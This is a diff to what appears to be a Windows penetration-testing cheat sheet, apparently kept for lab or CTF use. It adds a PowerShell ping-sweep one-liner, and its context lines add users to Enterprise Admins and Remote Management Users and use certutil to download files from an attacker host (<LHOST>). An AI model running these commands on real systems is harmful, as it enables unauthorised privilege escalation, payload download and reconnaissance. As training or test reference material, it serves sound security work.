@@ -20,7 +20,7 @@ net group "Enterprise Admins" /add /domain
 type c:\Windows\System32\Drivers\etc\hosts
 
 # permissions
-icacls C:\<PATH>
+icacls C:\<FOLDER>
 
 # tree
 tree /F
@@ -36,5 +36,8 @@ net localgroup "Remote Management Users" <USERNAME> /add
 # download
 certutil -urlcache -split -f http://<LHOST>/<FILE>
 certutil -urlcache -split -f http://<LHOST>:8000/<FILE>
+
+# ping sweep host discovery eg. replace subnet with 10.0.0
+1..254 | % {"<SUBNET>.$($_): $(Test-Connection -count 1 -comp <SUBNET>.$($_) -quiet)"}
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
